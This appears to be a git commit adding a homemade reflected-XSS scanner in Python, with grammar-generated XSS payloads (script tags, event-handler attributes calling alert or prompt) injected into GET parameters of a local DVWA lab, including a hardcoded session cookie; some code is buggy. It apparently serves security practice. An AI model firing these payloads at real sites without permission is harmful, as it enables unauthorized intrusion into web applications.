1d4d7ea9b970c07b49f56ff3eca743cf5133dbb3
nguyenanh1997 <setsuna01668298591@gmail.com>
2021-04-19 23:21:36 +0700

    Add files via upload

--- connect.py
+++ connect.py
@@ -1,25 +1,64 @@
 class connect:
-    def normal_GET(self, url, param, payload):
+    param = []
+    # this function will build content for post request
+    def build_content(self, params, payload):
+        i = 0
+        content = "{"
+        for param in params:
+            content = content + "\""+param + "\":\""+ payload+"\""
+            if i < len(params)-1:
+                content = content + ","
+            i = i + 1
+        content = content + "}"
+        return content
+
+    #the function below will build url for get request
+    def build_url(self, url, payload):
+        from urllib.parse import urlparse, quote
+        url = urlparse(url)
+        for i in url.query.split("&"):
+            self.param.append(i.split("=")[0])
+        url = url.scheme + "://" + url.netloc + url.path + "?"
+        i = 0
+        if len(self.param) > 0: 
+            for p in self.param:
+                url = url + p + "=" + quote(payload)
+                if i != len(self.param)-1: 
+                    url = url + "&"
+                    i = i + 1
+        return url
+
+    def normal_GET(self, url, payload, cookie):
         from requests_html import HTMLSession
         import pyppdf.patch_pyppeteer
         session = HTMLSession()
+        url  = self.build_url(url, payload)
 
-        resp = session.get(url + "?" + param + "=" + payload)
-
+        #old function  get() khong auto redirect
+        '''
+        resp = session.get(url) 
+        '''
+        
+        # new function
+        resp = session.request("GET", url=url, cookies=cookie)
         return resp
         
-    def normal_POST(self, url='http://testphp.vulnweb.com/search.php', param, payload):
+    def normal_POST(self, url, params, payload, cookie):
         from requests_html import HTMLSession
-        
+        content = self.build_content(params, payload)
         session = HTMLSession()
-        resp = session.post( url, data = {param : payload})
+
+        #old function
+        '''
+        resp = session.post( url, data = content)
+        '''
+
+        #new function
+        resp = session.request("POST", "url", cookies=cookie, data=content)
+        return resp.render()
+
+
+    def render_GET(self,url, payload, cookie):
+        resp = self.normal_GET( url, payload, cookie)
+        #resp.html.render()
         return resp
-
-
-    def render_GET(self,  url, param, payload):
-        resp = self.normal_GET( url, param, payload)
-        resp.html.render()
-        return resp
-
-a = connect()
-print(a.render_GET('http://gamek.vn').text)
--- xssPayload.py
+++ xssPayload.py
@@ -1,10 +1,10 @@
 from a import simple_grammar_fuzzer
-
+from connect import connect
 class xssPayload:
 
-    detect = "111111111111111"
     def __init__(self):
-        pass
+        self.payloads = set()
+        self.detect = "111111111111111"
     
     def generator(self, GRAMMAR):
         return set([simple_grammar_fuzzer(GRAMMAR) for i in range(50)])
@@ -19,19 +19,22 @@ class xssPayload:
             "@specialCharacter@" : [">"],
             "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
         }
-        return self.generator(XSS_PAYLOAD1 )
+        return self.generator(XSS_PAYLOAD1)
 
-    #payload include global variable like: self, ...
-    def generator_xss_3(self):
-        XSS_PAYLOAD3 = {
+    
+    def generator_xss_4(self):
+        XSS_PAYLOAD4 = {
             "@start@" : ["@payload@"],
-            "@payload@" : ["@global@[@command@](@value@)"],
-            "@global@" : ["self"],
-            "@command@" : ["alert", "prompt"],
-            "@value@" : ["111111111111111"]
-        
+            "@payload@" : ["@tag@@src@@space@@event@@quote@@command@@quote@@endtag@"],
+            "@tag@" : ["<a ", "<img ", "<iframe ", "<div "],
+            "@src@" : ["src=hihi ", "href=hihi "],
+            "@quote@" : ["\"", "'"],
+            "@space@" : ["", " "],
+            "@endtag@" : [">"],
+            "@event@" : ["onunload=", "onscroll=", "onfocus=", "onclick=", "onmouseover=", "onmouseout=", "onload=", "onerror=" , "onresize=", "onrropertychange=", "onpagehide="],
+            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
         }
-        return self.generator(XSS_PAYLOAD3)
+        return self.generator(XSS_PAYLOAD4)
 
     #payload format: " onload="javascript:alert(1)"
     def generator_xss_2(self):
@@ -45,6 +48,54 @@ class xssPayload:
         }
         return self.generator(XSS_PAYLOAD2 )
 
+    #payload include global variable like: self, ...
+    def generator_xss_3(self):
+        XSS_PAYLOAD3 = {
+            "@start@" : ["@payload@"],
+            "@payload@" : ["@global@[@command@](@value@)"],
+            "@global@" : ["self"],
+            "@command@" : ["alert", "prompt"],
+            "@value@" : ["111111111111111"]
+        
+        }
+        return self.generator(XSS_PAYLOAD3)
+
+    def generator_xss(self):
+        pass
     
+
+    def scan(self, url, cookie): #link, method):
+        import random
+        from bs4 import BeautifulSoup as bs
+        conn = connect()
+        self.payloads.update(self.generator_xss_1())
+        self.payloads.update(self.generator_xss_4())
+        self.payloads.update(self.generator_xss_3())
+        self.payloads.update(self.generator_xss_2())
+        payloads = list(self.payloads)
+        listPayload = []
+        j = random.randrange(0, len(payloads))
+        for i in payloads:
+            if j == 0:
+                break 
+            # get ramdomly payload from list payload
+            if i not in listPayload:
+                listPayload.append(payloads[j])
+
+                #source = conn.normal_POST(url, params="text", payload="\"><script>alert(1)</script>")
+                # give up post method, because xss via post method not damage much to web site. 
+                source = conn.render_GET(url,payloads[j], cookie)
+
+                source.html.render(timeout=1000)# render javascript
+                print(payloads[j])
+                if payloads[j] in str(source.content):
+                    print("Co loi")          #--------------------> Có lỗi
+                    return True
+
+            j = j - 1
+        return False
+            
+
 a = xssPayload()
-print(a.generator_xss_3())
+cookie = {"PHPSESSID" : "ompkj7fig765mo70k3kvfb1mh2", "security": "low"} 
+print(a.scan("http://192.168.1.125/dvwa/vulnerabilities/xss_r/?name=aa#", cookie) )
